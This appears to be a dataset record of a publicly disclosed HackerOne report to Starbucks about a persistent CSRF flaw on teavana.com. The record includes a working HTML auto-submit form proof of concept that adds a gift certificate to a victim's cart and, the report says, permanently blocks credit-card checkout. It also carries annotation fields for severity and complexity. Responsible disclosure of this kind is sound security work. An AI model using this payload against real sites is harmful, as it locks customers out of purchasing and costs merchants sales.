{
    "reported_to": "Starbucks",
    "reported_by": "inhibitor181 ",
    "title": "Persistent CSRF in /GiftCert-AddToBasket prevents purchases on eCommerce sites",
    "content": "\nSUMMARY\nHello, I have found an extremely interesting issue that can be used to permanently lock a user's possibility of ever buying anything from teavana.com by removing the credit card payment method.\nPOC\nCSRF snippet\nCode 1.21 KiB\n1<html>\n2\t<head></head>\n3\t<body>\n4\t\t<form method=\"POST\" id=\"GiftCertificateForm\" action=\"http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-AddToBasket\">\n5\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_from\" type=\"text\" name=\"dwfrm_giftcert_purchase_from\" value=\"Test whatever\" maxlength=\"2147483647\">\n6\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipient\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipient\" value=\"Test whhhateever\" maxlength=\"2147483647\">\n7\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_recipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_recipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n8\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" type=\"text\" name=\"dwfrm_giftcert_purchase_confirmRecipientEmail\" value=\"valid@iamvalid.com\" maxlength=\"2147483647\">\n9\t\t\t<textarea class=\"textbox\" id=\"dwfrm_giftcert_purchase_message\" name=\"dwfrm_giftcert_purchase_message\" rows=\"5\" cols=\"50\">Bla bla</textarea>\n10\t\t\t<input class=\"textinput\" id=\"dwfrm_giftcert_purchase_amount\" type=\"text\" name=\"dwfrm_giftcert_purchase_amount\" value=\"100\" maxlength=\"2147483647\">\n11\t\t\t<input type=\"submit\" value=\"Send\" />\n12\t\t</form>\n13\t</body>\n14</html>\nDESCRIPTION\nSo, I just wanted to find demandware.store hidden links and in my search I stumbled across\nCode 87 Bytes\n1http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-Purchase\nFrom here, one can add custom gift cards in cart with a value between 5 and 5000 euros (or something like that). I have noticed that this is not CSRF protected, but this was a minor issue. Well, it became a serious problem after I noticed that after adding that gift card in my card, I wasn't able to fully empty my cart anymore and the credit card option was simply not available anymore and I wasn't able to fulfill any orders. Logging out and in doesn't do anything. Deleting cart product doesn't do anything. And because I tested teavana for some time, I know for a fact that the items in cart stay in cart (even after weeks).\nSo, I have made a new account, added the CSRF POC in a script then tested the flow and it worked. I have made my account unable to buy anything by adding that gift card in cart.\nIMPACT\nPermanently denying a user the possibility to fulfill with his account any orders is a very big issue (hence the High severity I personally find) and if someone launched an attack against you, you will lose customers and money (not to mention the potentially negative publicity)\nVideo POC attached.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1494887400,
    "report_url": "https://hackerone.com/reports/206319",
    "is_multi_component": false,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the gift certificate purchase page at http://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/GiftCert-Purchase"
        ],
        [
            2,
            "Submit a crafted CSRF form (as shown in the POC) to add a gift certificate to the cart, which triggers the vulnerability"
        ]
    ],
    "vuln_description": "The vulnerability is a persistent CSRF issue in the /GiftCert-AddToBasket endpoint that allows an attacker to permanently lock a user's ability to make purchases by adding a gift certificate to their cart. This action removes the credit card payment method and cannot be undone by normal means like emptying the cart or logging out/in.",
    "reason": "The attack involves understanding the CSRF vulnerability and its impact on the shopping cart state, but does not require complex interactions between multiple components or manipulation of intricate application states. The discovery mainly involves identifying an unprotected endpoint and observing its persistent effects on the user's account.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}